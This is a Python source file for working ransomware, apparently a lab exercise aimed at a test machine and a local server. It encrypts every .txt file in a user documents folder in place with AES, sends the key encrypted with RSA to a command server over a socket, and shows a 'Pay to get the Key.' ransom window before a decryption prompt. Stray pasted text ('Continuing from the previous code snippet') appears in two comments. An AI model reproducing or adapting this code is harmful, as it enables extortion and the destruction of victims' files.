import os
import secrets
import socket
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
from Crypto.Cipher import AES
import tkinter as tk
from tkinter import messagebox
SERVER_IP = '127.0.0.1'
SERVER_PORT = 5678

# Generate a random 128-bit key
key = secrets.token_bytes(16)

# Define the directory to search for .txt files
dir_path = 'C:/Users/testmachine/Documents'

# Function to encrypt a file using AES-128 in ECB mode with PKCS#7 padding
def encrypt_file(filename, key):
    # Define the padding scheme
    padder = padding.PKCS7(algorithms.AES.block_size).padder()

    # Read the plaintext from the file
    with open(filename, 'rb') as f:
        plaintext = f.read()

    # Pad the plaintext using PKCS#7
    padded_plaintext = padder.update(plaintext) + padder.finalize()

    # Create the cipherobject with AES-128 and ECB mode
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())

    # Create the encryptorobject and encrypt the padded plaintext using the key
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    # Write the ciphertext back to the file
    with open(filename, 'wb') as f:
        f.write(ciphertext)

# Walk through the directory and encrypt all .txt files
for root, dirs, files in os.walk(dir_path):
    for file in files:
        if file.endswith('.txt'):
            filepath = os.path.join(root, file)
            #print('Encrypting file:', filepath)
            messagebox.showinfo('Encrypting file:', filepath)
            encrypt_file(filepath, key)

# Convert the key to bytes
key_bytes = bytes(key)
# Save the keys to a file
# get the path to the desktop folder
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")  
# create the file path for the key pair file
key_file_path = os.path.join(desktop_path, "Key.key")  

with open(key_file_path, "w") as key_file:
    key_file.write(str(key))

print("Key pair saved to desktop as key.key",key)

# Create a socket and connect to the server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
# Load the server's public key
    public_pem=s.recv(2048)
    
    #print(public_pem)
    public_key = serialization.load_pem_public_key(
        public_pem,
        backend=default_backend()
    )
    #print(key_bytes)
# Encrypt the key using the server's public key
    encrypted_key = public_key.encrypt(key_bytes, asymmetric_padding.OAEP(
    mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(),
    label=None
        ))
    # get the path to the desktop folder
    desktop_path0 = os.path.join(os.path.expanduser("~"), "Desktop")  
    key_file_path1 = os.path.join(desktop_path0, "encryptedKey.key")
    with open(key_file_path1, "wb") as f:
        f.write(encrypted_key)
    # Send the encrypted key to the server
    s.sendall(encrypted_key)
    
    # print('Encryption complete and encrypted key sent to server.')

    # Wait for the server to acknowledge receipt of theencrypted key
    data = s.recv(2048)
   # print(data.decode())
    #print(data)
   
    def decrypt_files():
   # Create a new AES cipher object
        cipher = AES.new(key, AES.MODE_ECB)

    # Loop through all files in the encrypted directory
        for filename in os.listdir(dir_path):
            if filename.endswith('.txt'):
            # Define the path to the encrypted file
                encrypted_file_path = os.path.join(dir_path, filename)

        # Define the path to the decrypted file
                decrypted_file_path = os.path.join(dir_path, filename)

        # Open the encrypted file in binary mode
                with open(encrypted_file_path, 'rb') as f:
                    encrypted_data = f.read()

        # Remove the PKCS#7 padding from the encrypted data
                decrypted_data = cipher.decrypt(encrypted_data)
                padding_length = decrypted_data[-1]
                decrypted_data = decrypted_data[:-padding_length]

        # Write the decrypted datato a new file
                with open(decrypted_file_path, 'wb') as f:
                    f.write(decrypted_data)
        # print('Files Decrypted')
        messagebox.showinfo("Decryption Complete", "All files have been decrypted successfully.")
        win.destroy()
    def close_window():
        wind.destroy()
    # Create a popup window
    wind = tk.Tk()

# Set the size of the popup window
    wind.geometry('300x100')

# Add a label toContinuing from the previous code snippet:


# the popup window
    label = tk.Label(wind, text="Pay to get the Key.")
    label.pack(pady=10)

# Add a button to the popup window
    button = tk.Button(wind, text="Pay",command=close_window)
    button.pack()
    
# Start the GUI event loop  
    wind.mainloop()

    # Create a popup window
    win = tk.Tk()

# Set the size of the popup window
    win.geometry('600x100')

# Add a label toContinuing from the previous code snippet:

    decry="The Decryption key is: "+ str(data) + ""
# the popup window
    label = tk.Label(win, text=decry)
    label.pack(pady=10)

# Add a button to the popup window
    button = tk.Button(win, text="Decrypt Files", command=decrypt_files)
    button.pack()

# Start the GUI event loop  
    win.mainloop()
